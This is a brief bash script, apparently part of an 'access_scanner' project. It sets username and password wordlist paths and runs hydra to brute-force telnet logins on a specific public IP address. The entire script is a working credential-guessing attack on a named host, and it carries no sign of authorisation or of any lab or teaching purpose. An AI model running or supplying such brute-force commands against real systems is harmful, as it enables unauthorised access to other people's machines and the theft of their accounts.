#!/bin/bash

USERNAMES="/home/arch/Desktop/git/access_scanner/wordlists/usernames.txt"
PASSWORDS="/home/arch/Desktop/git/access_scanner/wordlists/500p.txt"

hydra -L "$USERNAMES" -P "$PASSWORDS" telnet://44.27.43.85

